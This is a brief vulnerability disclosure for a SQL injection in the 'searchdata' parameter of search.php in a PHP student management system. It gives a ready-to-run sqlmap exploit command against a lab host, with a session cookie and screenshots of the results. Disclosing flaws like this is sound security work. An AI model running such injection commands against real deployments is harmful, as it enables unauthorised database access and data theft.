vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16137/online-student-management-system-php-free-download.html

Vulnerability trigger parameter: $searchdata

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/220948201-018d0ecb-3097-42b0-8959-a5e37b3d805c.png)


exp

```
sqlmap.py -u "http://192.168.31.50/eduauth/student/search.php" --data "searchdata=1&search=" --cookie "PHPSESSID=po9tmu5iqkuvffteh4b6rur4g0"
```
![image](https://user-images.githubusercontent.com/30823782/220948245-9253bd26-9cc3-45fa-adab-cf7ce9e94f53.png)

